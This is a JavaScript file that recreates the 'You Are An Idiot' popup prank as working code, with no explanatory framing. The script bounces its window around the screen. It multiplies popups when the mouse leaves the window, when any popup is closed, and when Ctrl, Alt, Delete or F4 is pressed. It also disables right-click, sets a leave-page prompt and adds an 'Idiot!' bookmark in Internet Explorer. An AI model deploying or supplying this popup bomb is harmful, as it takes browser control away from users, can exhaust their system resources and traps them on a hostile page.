/* ================= Audio Handling ================= */
document.addEventListener('click', function playMusicOnce() {
    const audio = document.getElementById('youare-audio');
    const micon = document.getElementById('youare-micon');

    if (!audio || !micon) return;

    if (audio.paused) {
        audio.play();
        micon.src = "images/speaker.png";
    } else {
        audio.pause();
        audio.currentTime = 0;
        micon.src = "images/speakerm.png";
    }

    // Remove the document-level listener after first user click (required by browsers)
    document.removeEventListener('click', playMusicOnce);
}, { once: true });

// Looping background audio with a small buffer
const faudio = new Audio('youare.mp3');
faudio.addEventListener('timeupdate', function () {
    if (this.currentTime > this.duration - 0.45) {
        this.currentTime = 0;
        this.play();
    }
});

/* ================= Bookmark (IE only) ================= */
function bookmark() {
    if (navigator.appName === "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {
        window.external.AddFavorite("lol.html", "‎‎Idiot!");
    }
}

/* ================= Window Movement ================= */
let xOff = 5, yOff = 5;
let xPos = 400, yPos = -100;
let flagRun = 1;

const openWindows = []; // Track all popups

function openWindow(url) {
    const width = 357;
    const height = 330;
    const left = Math.floor((screen.width - width) / 2);
    const top = Math.floor((screen.height - height) / 2);

    const features = `menubar=no,status=no,toolbar=no,resizable=no,width=${width},height=${height},left=${left},top=${top},noopener,noreferrer`;

    const aWindow = window.open(url, "_blank", features);

    if (aWindow) {
        openWindows.push(aWindow);

        // Monitor for closure
        const timer = setInterval(() => {
            // Remove closed windows
            for (let i = openWindows.length - 1; i >= 0; i--) {
                if (openWindows[i].closed) openWindows.splice(i, 1);
            }

            // When this specific window closes, spawn duplicates
            if (aWindow.closed) {
                clearInterval(timer);
                const countToOpen = Math.max(1, openWindows.length);
                for (let i = 0; i < countToOpen; i++) {
                    openWindow('lol.html');
                }
            }
        }, 500);
    }
}

function proCreate() {
    for (let i = 0; i < 5; i++) {
        openWindow('lol.html');
    }
}

// Random direction changes
function newXlt() { xOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
function newXrt() { xOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }
function newYup() { yOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
function newYdn() { yOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }

function fOff() { flagRun = 0; }

// Main bouncing logic
function playBall() {
    xPos += xOff;
    yPos += yOff;

    if (xPos > screen.width - 357) newXlt();
    if (xPos < 0) newXrt();
    if (yPos > screen.height - 330) newYup();
    if (yPos < 0) newYdn();

    if (flagRun === 1) {
        try {
            window.moveTo(xPos, yPos);
        } catch (e) {
            console.warn("Window movement blocked by browser.");
            flagRun = 0;
        }
        setTimeout(playBall, 16); // ~60fps for smooth movement
    }
}

/* ================= Window Events ================= */
window.onload = function () {
    flagRun = 1;
    playBall();
    bookmark(); // IE only
};

window.onmouseout = function () {
    proCreate();
};

window.oncontextmenu = function () {
    return false; // Disable right-click
};

window.onkeydown = function (event) {
    const keyCode = event.keyCode;
    if ([17, 18, 46, 115].includes(keyCode)) { // Ctrl, Alt, Delete, F4
        proCreate();
    }
};

window.onbeforeunload = function () {
    return " ";
};
